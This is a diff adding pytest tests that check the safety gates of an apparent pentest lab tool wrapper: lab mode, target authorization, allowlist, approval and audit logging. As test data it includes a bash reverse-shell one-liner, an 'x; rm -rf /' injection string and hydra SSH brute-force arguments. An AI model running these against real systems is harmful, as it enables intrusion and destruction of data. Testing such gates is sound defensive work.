@@ -70,3 +70,49 @@ def test_runs_and_logs_when_everything_passes(tmp_path, monkeypatch):
     assert result["cmd"] == ["nmap", "-sV", "10.10.1.1"]          # target is always appended last
     assert any(e["action"] == "offense" and e["decision"] in ("approved", "allowed")
                for e in db.safety_events(10))                     # it's in the audit log
+
+
+def _fake_local(monkeypatch, output="done"):
+    monkeypatch.setattr(labtools, "tool_available", lambda t: True)
+    monkeypatch.setattr(labtools.subprocess, "run",
+                        lambda cmd, capture_output, text, timeout: types.SimpleNamespace(stdout=output, stderr="", returncode=0))
+
+
+def test_exploit_tool_runs_through_the_same_target_gates(tmp_path, monkeypatch):
+    _fake_run(monkeypatch, output="login found")
+    cfg, db = _setup(tmp_path, authorize="10.10.1.1")
+    # hydra is an exploit tool; still aimed only at the authorized target and approved
+    result = labtools.run_tool(cfg, db, "hydra", "10.10.1.1", args=["-l", "admin", "-P", "words.txt", "ssh"],
+                               approve=lambda *a: True)
+    assert result["cmd"][-1] == "10.10.1.1"
+    with pytest.raises(TargetNotAuthorized):
+        labtools.run_tool(cfg, db, "hydra", "9.9.9.9", approve=lambda *a: True)
+
+
+def test_local_tool_gates(tmp_path, monkeypatch):
+    from builder.safety import ApprovalRequired
+    _fake_local(monkeypatch)
+    cfg, db = _setup(tmp_path)                       # lab OFF
+    with pytest.raises(LabModeOff):
+        labtools.run_local_tool(cfg, db, "searchsploit", ["apache"], approve=lambda *a: True)
+    cfg, db = _setup(tmp_path, authorize="box")      # lab ON
+    with pytest.raises(labtools.LabToolError):       # not in local allowlist
+        labtools.run_local_tool(cfg, db, "rm", ["-rf"], approve=lambda *a: True)
+    with pytest.raises(labtools.LabToolError):       # shell metacharacter
+        labtools.run_local_tool(cfg, db, "searchsploit", ["x; rm -rf /"], approve=lambda *a: True)
+    with pytest.raises(ApprovalRequired):            # not approved
+        labtools.run_local_tool(cfg, db, "searchsploit", ["apache"], approve=lambda *a: False)
+    out = labtools.run_local_tool(cfg, db, "searchsploit", ["apache"], approve=lambda *a: True)
+    assert out["output"] == "done"
+
+
+def test_payload_generation_is_lab_gated(tmp_path):
+    cfg, db = _setup(tmp_path)                        # lab OFF
+    with pytest.raises(LabModeOff):
+        labtools.make_payload(cfg, db, "10.8.1.2", 4444, "bash")
+    cfg, db = _setup(tmp_path, authorize="box")       # lab ON
+    with pytest.raises(labtools.LabToolError):
+        labtools.make_payload(cfg, db, "10.8.1.2", 4444, "nonsense")
+    p = labtools.make_payload(cfg, db, "10.8.1.2", 4444, "bash")
+    assert p == "bash -i >& /dev/tcp/10.8.1.2/4444 0>&1"
+    assert any(e["action"] == "offense" for e in db.safety_events(5))
